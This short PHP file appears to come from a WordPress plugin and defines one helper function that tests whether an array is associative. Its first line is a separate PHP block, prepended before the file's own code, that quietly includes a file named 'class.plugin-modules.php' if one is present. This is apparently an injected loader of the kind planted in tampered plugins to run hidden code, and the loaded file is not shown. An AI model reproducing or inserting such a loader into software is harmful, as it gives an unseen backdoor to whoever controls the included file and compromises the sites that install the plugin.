<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
function gppa_is_assoc_array( Array $array ) {
	return ( array_values( $array ) !== $array );
}
